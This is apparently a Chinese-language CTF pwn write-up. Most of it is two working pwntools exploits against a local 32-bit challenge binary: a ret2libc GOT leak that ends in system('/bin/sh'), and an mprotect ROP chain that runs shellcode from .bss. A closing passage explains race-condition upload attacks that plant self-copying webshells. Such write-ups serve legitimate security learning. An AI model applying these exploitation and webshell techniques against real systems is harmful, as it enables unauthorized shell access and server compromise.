#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./pwn')
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

p = process('./pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_func = elf.symbols['main']

offset = 140
ret = 0x0804900a

p.sendafter(b"payload:\n", b'A' * 8)

# Stage 1: leak
payload1  = b'A' * offset
payload1 += p32(puts_plt)
payload1 += p32(main_func)
payload1 += p32(puts_got)

p.sendline(payload1)

leak = u32(p.recv(4))
libc_base = leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"[*] system: {hex(system_addr)}")

# Stage 2: system("/bin/sh")
p.sendafter(b"payload:\n", b'B' * 8)

payload2  = b'A' * offset
payload2 += p32(ret)          # 栈对齐
payload2 += p32(system_addr)
payload2 += p32(0xdeadbeef)
payload2 += p32(binsh_addr)

p.sendline(payload2)

p.interactive()

然后这里还有一个hint函数，说白了就是告诉你们还可以打这个，都没换名字了，可能换名字还需要找一下。 调用了mprotect，但是好像这里啥都没干，但是我们可以修改参数去调用，先介绍一下这个函数的作用吧： int mprotect(const void *start, size_t len, int prot); mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 一般prot直接修改为7，即可读可写可执行。这样修改之后就可以控制特定的内存空间可以去执行shellcode，需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 所以我们这里就找.bss段(没原因，纯用惯了)，找到起始地址就可以编写了。可以在IDA中使用Shift+F7直接看。 然后就可以编写exp了。

#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

p = process('./pwn')

mprotect_plt = 0x08049040
read_plt     = 0x08049050
bss_start    = 0x0804b340
bss_page     = 0x0804b000
pop3_ret     = 0x08049216
offset       = 140

shellcode = asm(shellcraft.sh())

p.sendafter(b"payload:\n", b'A' * 8)

payload  = b'A' * offset
payload += p32(mprotect_plt)
payload += p32(pop3_ret)
payload += p32(bss_page)
payload += p32(0x1000)
payload += p32(7)
payload += p32(read_plt)
payload += p32(bss_start)
payload += p32(0)
payload += p32(bss_start)
payload += p32(0x100)

p.sendline(payload)
sleep(0.3)
p.send(shellcode)

p.interactive()

条件竞争介绍

条件竞争上传是文件上传的一种攻击手法，简单来说就是抢菜。 服务器有一批资源(菜)，然后我们现在上传和删除都需要资源(菜)，但是服务器补充菜是需要时间的，所以在他没补充好之前，删除就没有足够的资源去删，就会导致服务器卡。在这个间隙中间，我们发送一个访问请求，服务器处理的时候就会解析里面的webshell。 所以大部分时候我们会写一个生成新的木马在同目录的马，这样子只要访问到我们就可以写一个新的，不会被这个上传过程删除的马。
